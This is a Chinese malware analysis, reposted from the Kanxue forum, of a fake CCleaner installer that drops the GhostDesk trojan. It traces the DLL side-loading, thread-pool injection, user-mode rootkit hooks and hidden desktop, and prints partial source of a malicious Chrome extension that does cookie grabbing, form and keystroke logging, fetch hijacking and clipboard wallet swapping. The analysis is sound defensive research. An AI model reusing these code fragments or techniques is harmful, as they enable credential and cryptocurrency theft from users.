---
title: 【微信】仿冒 CCleaner 投递 GhostDesk 木马
source: https://mp.weixin.qq.com/s/k671VHF4cB4YmTvf1dxcmQ
source_host: mp.weixin.qq.com
clip_date: 2026-10-31T18:22:46+08:00
trace_id: 39e02a1f-c08c-45c0-879b-5aad8c113866
content_hash: 8162cb8cc453589f489dacba3acc055d28ff2d6047a6979294ee22f98bde43a3
status: synced
tags:
  - 微信
  - 恶意样本
  - Hook
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 仿冒 CCleaner 官网的木马经 DLL 侧加载与线程池注入内存执行主控载荷，再用用户态 Rootkit 隐藏进程与 C2 端口，最终借 Chrome 恶意扩展窃取账号密码并篡改剪贴板中的加密货币地址。
ai_summary_style: key-points
images_status:
  total: 36
  succeeded: 36
  failed_urls: []
notion_page_id: 40a75244-d011-813d-8c25-f633ac3a7303
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 仿冒 CCleaner 官网的木马经 DLL 侧加载与线程池注入内存执行主控载荷，再用用户态 Rootkit 隐藏进程与 C2 端口，最终借 Chrome 恶意扩展窃取账号密码并篡改剪贴板中的加密货币地址。
> 
> - **持久化与“白加黑”：** 伪造安装程序在 %APPDATA%\Microsoft\Vault 投放白文件 cscript.exe、恶意加载器 version.dll 与加密 Payload AppxState.dat，并写注册表 UserInitMprLogonScript 键，借 userinit.exe 实现比 Run 键更隐蔽的开机自启。
> - **隐蔽执行链：** version.dll 解密函数名后动态获取 ntdll!TpAllocWork/TpPostWork，用线程池注入唤醒合法 Worker 线程执行回调（规避 CreateThread 告警），回调隐藏 cscript.exe 控制台窗口，再用 BCrypt 库解密 AppxState.dat 并修改内存属性后直接内存加载 DLL——其导出函数伪装成 Synaptics 触控板服务的 SynTPEnhService_1。
> - **用户态 Rootkit：** 主控载荷释放 runtimebroker.dll/runtimebroker.cfg，对 NtQueryDirectoryFile、GetExtendedTcpTable、NtQuerySystemInformation 等做全局 Inline Hook（E9 JMP 覆写），按 cfg 内容隐藏 C2 端口 7788 与 syntphelper、syntpmonitor、onedrivesync 等恶意进程，使 netstat、Wireshark、PCHunter 等工具失察。
> - **落地窃密：** 木马创建隐藏桌面 \CryptSvc_0a5c（HVNC），篡改 Chrome 快捷方式加 --load-extension 参数强制加载恶意扩展；扩展内置 BTC/ETH/SOL/TRX/LTC 钱包地址正则做剪贴板收割，劫持 fetch/粘贴/按键事件窃取明文凭据，并经 ws://127.0.0.1:7345/ext 由宿主本地代理转发 C2 流量以规避浏览器出站审计。

**看雪学苑** *2026年10月31日 17:59*

近期有威胁情报检测到伪装成知名系统清理工具 CCleaner 的恶意软件。攻击者搭建了仿冒的官方网站（ccleanerwind\[.\]top ），诱导受害者下载伪造的安装程序 CCleaner.exe 。该程序安装运行后，会进行 DLL 侧加载、无文件内存加载、用户态 Rootkit 等操作，并最终以 Chrome 浏览器的恶意扩展落地，目的在于监控和窃取受害者的敏感信息，包括加密货币钱包地址。（下文记录了多次调试，可能存在PID、内存地址前后不一致的地方，见谅）

## 1\. DLL 侧加载和持久化

CCleaner.exe 安装运行后，向 %APPDATA%\\Microsoft\\Vault 路径写入三个文件

-   cscript.exe（微软的脚本运行工具，白文件）
    
-   version.dll（恶意加载器，会读取AppxState.dat）
    
-   AppxState.dat（加密的 Payload）
    

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dc311f9b90fd4646.png)

接着 CCleaner.exe 会创建进程，运行 cscript.exe。 cscript.exe 进程被拉起后，加载 version.dll ，立即扫描同目录下的.dat 文件，找到 AppxState.dat 后读取。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/deafa462393f147a.png)

cscript.exe 读取 AppxState.dat 后，会将注册表 Environment\\UserInitMprLogonScript 的键值设置为 cscript.exe 所在路径

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/af10d45ee0039e0a.png)

当用户登录 Windows 时，进程 winlogon.exe 会启动 userinit.exe 初始化用户环境。userinit.exe 会自动检测 HKCU\\Environment 下是否存在 UserInitMprLogonScript。若存在该项，userinit.exe 会以后台方式静默启动该项中指定的程序或脚本（如.bat、.vbs、.ps1 或恶意 exe/cscript.exe 等）。与Run 键设置相比，这种方式更为隐蔽地实现了恶意程序的开机自启动

## 2\. version.dll 侧加载

## 2.1 获取函数地址：TpAllocWork 和 TpPostWork

IDA 查看 version.dll，看到开始部分有函数 DisableThreadLibraryCalls，这个是 kernel32.dll 的导出函数； x64dbg 调试cscript.exe，程序加载 version.dll 后，先在这个函数下个断点。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/cf38e12baf431a3a.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0582f96702d20980.png)

成功断了下来，接着往下单步运行，可以看到函数 GetModuleHandleW()  
获取 ntdll.dll 句柄后，可以看到接下来应该是解密某个函数名称，再通过 GetProcAddress 获取这个函数地址。

再往下运行，验证了猜想。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5dd206921380d09b.png)

先是获取了 ntdll!TpAllocWork 和 ntdll!TpPostWork 的函数地址并保存在 rsi 和 rdi 这两个寄存器当中，然后调用了这两个函数。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5bc1889a839e2cd8.png)

## 2.2 线程池注入

ntdll!TpAllocWork 和 ntdll!TpPostWork 函数的调用是很明显的线程池注入特征。使用 CreateThread 太容易引发 安全软件的告警，攻击者选择利用线程池机制，更隐蔽一点。

```
NTSTATUS NTAPI TpAllocWork(
    PTP_WORK*            WorkReturn,        // RCX：返回创建好的work对象指针
    PTP_WORK_CALLBACK    Callback,          // RDX：当 work 激活时，要调用的函数地址
    PVOID                Context,           // R8 ：传给 Callback 的参数
    PTP_CALLBACK_ENVIRON CallbackEnviron    // R9 ：环境控制
);
```

TpPostWork 执行后，操作系统内置线程池中一个已存在的休眠 Worker 线程被唤醒，读取回调函数地址（即 sub_1800035C0，动态调试界面中 RDX 保存的地址 0x00007FFF6C3035C0）并直接跳转执行。

这个线程的入口是合法的线程池调度器，引发告警的可能性要小一点。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4db525f207cb8a57.png)

## 2.3 执行恶意回调函数

在 0x00007FFF6C3035C0下断点，成功断了下来

调用 Sleep(0x64)（100毫秒）  
调用 GetCurrentProcessId() 获取宿主（cscript.exe）的 PID  
调用 EnumWindows(EnumFunc, CurrentProcessId)  

EnumFunc 遍历所有顶级窗口，找到属于当前 PID 的窗口后，调用 ShowWindow(hwnd, SW_HIDE)，将 cscript.exe 的黑框控制台窗口隐藏（这个可以在桌面观察到）

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e1144c31b7f0f77c.png)

## 2.4 读取 Payload，内存加载恶意 dll

接下来获取文件所在路径，找到后缀为.dat 的文件，调用 readfile() 函数读取文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0b6a5fcf9e7d4af6.png)

然后调用 Windows 的 BCrypt 密码学库，对文件进行哈希校验和解密

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ac72ea9121158ccb.png)

最后通过修改内存属性（VirtualProtect）并冲刷指令缓存（FlushInstructionCache），直接在内存中执行dll

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/58840fe03e1e5993.png)

sub_1800010F 函数实现在内存中加载恶意 PE 文件

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/12143f962ec71c50.png)

调试时，可以看到内存地址 0x24C0000 有解密后的 PE 文件

## 3\. 内存加载的 dll

## 3.1 dll 执行入口

将内存中加载的 dump 下来，是一个dll 文件，IDA 看一下，导出函数名为SynTPEnhService_1()。

> `SynTPEnhService` 是 Synaptics 触控板服务的 API 名称，攻击者将载荷导出为同名函数，可能会骗过一些安全软件。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f74391e0817363cd.png)

暂且命名为 SynTPHelper.dll，然后继续动态调试；搜索内存加载 dll 关键函数结尾的部分，看到 call rax ，version.dll 的基址+0x149A，像是比较明显的 Payload 执行入口。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/030a457d8de0e7a8.png)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6dcae11409bc72ed.png)

```
mov eax, dword ptr ds:[rbx+28] ; 1. 取出入口点相对偏移 (RVA)
xor r8d, r8d                    ; 2. 第 3 个参数 R8 = 0 (lpReserved)
mov rcx, qword ptr ss:[rbp+40]  ; 3. 第 1 个参数 RCX = 新模块基址 (ImageBase)
mov edx, r14d                   ; 4. 第 2 个参数 RDX = 1 (DLL_PROCESS_ATTACH)
add rax, rcx                    ; 5. RAX = 新模块基址 + 入口点偏移 (计算出真正的入口地址)
call rax                        ; 6. 核心：正式调用解密后木马的 DllMain
```

## 3.2 创建文件 runtimebroker.dll 和runtimebroker.cfg

然后步进，在函数LoadLibraryW 设置硬件断点，在加载 runtimebroker.dll 断下来

```
bphws kernel32.LoadLibraryW, "x"
```

payload 运行后，可以观察到，实现了持久化机制，创建了文件 runtimebroker.dll 和runtimebroker.cfg

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d507a68a5acb4464.png)

runtimebroker.cfg 其中的内容为

```
7788
syntphelper
syntpmonitor
onedrivesync
```

## 4\. 用户态 Rootkit

## 4.1 创建多个线程

解密后的核心载荷一经 call rax 启动，在 14:25:07 这一秒钟内，突然暴增了十几个相同堆地址入口的线程，负责剪贴板文本监控、网络监听等功能

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/c30dfdeeff6d57e0.png)

## 4.2 加载 runtimebroker.dll

接着运行，来到了runtimebroker.dll 的入口处

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/ac16442aedc7f31b.png)

下硬件断点

```
bphws user32.GetLastInputInfo, "x"
```

### 4.2.1 API hook

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4a46cab4c75dff55.png)

以下是 hook 的 API

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/698bdd9afee43d52.png)

断下来之后，查看NtQueryDirectoryFile 处的指令，最开头的 5 个字节不再是原本的 mov r10, rcx / mov eax, 32h，而是被强制覆写成了一条跳转指令 jmp 7FFF36A10238，这是比较明显的钩子特征。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/9ffc91e32524fc7a.png)

```
GetCurrentThreadId() 检查是否在安装线程   
GetThreadContext(thread, &Context) 获取所有活跃线程 RIP
检查 RIP 是否在目标函数 ±96 字节范围内，防止打断正在执行该函数的线程
VirtualProtect(PAGE_EXECUTE_READWRITE)，使代码页可写
写 E9 JMP 补丁 / 清空原指令为 0xCC ，安装钩子
VirtualProtect 恢复原保护属性            
FlushInstructionCache() 清空 CPU 指令缓存
ResumeThread(suspended_threads)恢复被暂停的线程
```

使用 PCHunter 可以看到这些 API 确实被 Hook 了

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a688b1dbac827c42.png)

### 4.2.2 GetExtendedTcpTable

runtimebroker.dll 被加载后会读取runtimebroker.cfg 文件中的字符，

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/563d770280f42481.png)

runtimebroker.cfg 第一行 7788 正是 C2 主通道端口。该钩子使 netstat -ano、Wireshark 、Process Hacker 等工具无法显示该端口的连接记录

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b4b41fab4208543d.png)

可以确定 runtimebroker.cfg 文件中的每行字符的含义了

```
7788          → GetExtendedTcpTable 钩子的过滤端口
syntphelper   → NtQuerySystemInformation 钩子的隐藏进程名
syntpmonitor  → 隐藏进程名
onedrivesync  → 隐藏进程名
```

### 4.2.3 功能总结

runtimebroker.dll 的主要功能有

-   全局 Inline API 挂钩
    
-   隐藏网络端口
    
-   隐藏恶意进程
    

## 5\. 隐藏桌面和恶意扩展

## 5.1 隐藏桌面

cscript.exe 创建进程 explorer.exe

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/097c91d8f794ec36.png)

explorer.exe 也加载了 runtimebroker.dll。查看这个进程的句柄列表，返现有一个隐藏桌面 \\CryptSvc_0a5c，还是完全控制权限（Full control）。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/0e69a601d431ec1a.png)

这个桌面刚创建时，需要把系统的开始菜单、桌面快捷方式、图标缓存全部从头到尾索引一遍，才能在这个隐藏桌面上把任务栏和窗口管理器搭建起来。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/4b18df7a7ad22b5a.png)

## 5.2 恶意扩展

生成文件 manifest.json 、background.js 和 content.js

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/f54748e1b2273949.png)

SynTPHelper.dll 会将恶意扩展组件释放到本地，随后篡改 Chrome 的启动方式（添加 --load-extension 参数）强制加载该扩展，可以窃取加密货币钱包地址、监控屏幕和键盘记录、账户密码等敏感信息。

扩展不能直接连接外网 C2（受 Chrome 沙箱和内容安全策略限制），所以借助 SynTPHelper 作为本地透明代理完成转发。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/49c5ea717f626457.png)

background.js 的部分内容

```javascript
// 配置本地回环WebSocket中继地址，将C2流量交由宿主木马转发以规避浏览器出站网络审计
ws_url: "ws://127.0.0.1:7345/ext",
// 内置主流加密货币（BTC/ETH/SOL/TRX/LTC）的钱包地址正则匹配规则库，用于剪贴板收割
crypto_patterns: { btc: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/, eth: /^0x[a-fA-F0-9]{40}$/, sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, trx: /^T[a-zA-HJ-NP-Z0-9]{33}$/, ltc: /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,62}$/ },
// 远程指令解析分支，接收到命令后定向或全量提取受害者的身份会话凭证Cookie
case"cookie_grab": grabCookies(msg.domain);
// 远程动态代码注入接口，允许攻击者随时向受害者的特定标签页投毒执行任意JS脚本
case"inject_js": injectJS(msg.code, msg.tabId);
// 恶意痕迹 06: 远程静默截屏指令分支，调用接口秘密捕获受害者活动窗口的实时渲染画面
case"screenshot": captureTab();
// 恶意痕迹 10: 汇总前端拦截的表单账号密码与按键记录，附带标签页URL上下文后统一打包外送至木马
if (msg.t === "form_grab" || msg.t === "keylog" || msg.t === "inject_event") { msg.tab_url = sender.tab?.url || ""; msg.tab_title = sender.tab?.title || ""; sendToBot(msg); }
```

content.js 的部分内容

```javascript
// 声明GhostDesk家族专属缩写(__gd_)作为全局单例标志位，防止自身被重复注入执行
if (window.__gd_ext_loaded) return; window.__gd_ext_loaded = true;
// 遍历表单所有控件，无论是否带有掩码限制(password/text/hidden)，均提取为明文凭据
if (inp.type === "password" || inp.type === "text" || inp.type === "email" || inp.type === "tel" || inp.type === "hidden") { data[name] = inp.value; }
// 劫持现代浏览器原生的Fetch API，拦截网络请求体中提交的登录与支付载荷
window.fetch = function(input, init) { if (init && init.method && init.method.toUpperCase() === "POST" && init.body) { tryGrabBody(url, init.body); } return origFetch.apply(this, arguments); };
// 全局劫持系统粘贴(Paste)事件，在剪贴板文本落地前进行暗中截胡与校验比对
document.addEventListener("paste", (e) => { const text = (e.clipboardData || window.clipboardData).getData("text");
// 恶意痕迹 10: 间谍键盘记录器机制，监听击键动作并设置2秒防抖缓冲刷新，将输入框字段与文本打包外传
document.addEventListener("keypress", (e) => { keyBuffer += e.key; clearTimeout(keyTimer); keyTimer = setTimeou
```

## 6\. 运行流程总结

-   伪装成CCleaner，利用“白加黑”侧加载version.dll，并通过线程池注入技术在内存中无文件运行主控木马；
    
-   主控加载Rootkit模块runtimebroker，通过全局API Hook彻底隐藏其恶意进程、文件实体及C2通信端口；
    
-   创建隐藏桌面（HVNC）进行后台静默操作，并篡改Chrome快捷方式，强制浏览器加载其释放的恶意扩展；
    
-   利用恶意扩展深度监控网页，窃取账号密码、拦截2FA验证码，并实时将剪贴板中的加密货币地址替换为黑客地址。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/2a98136a3152b14d.jpg)
    

看雪ID：ZyOrca

https://bbs.kanxue.com/user-home-944427.htm

\*本文为看雪论坛优秀文章，由 ZyOrca 原创，转载请注明来自看雪社区

火热售票中！1.25折门票即将售罄

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/bc51e60a1ab9953f.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c953c0b9b281634c.gif)

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/3bda3987c6441739.webp)

**球分享**

**球点赞**

**球在看**

点击阅读原文查看更多
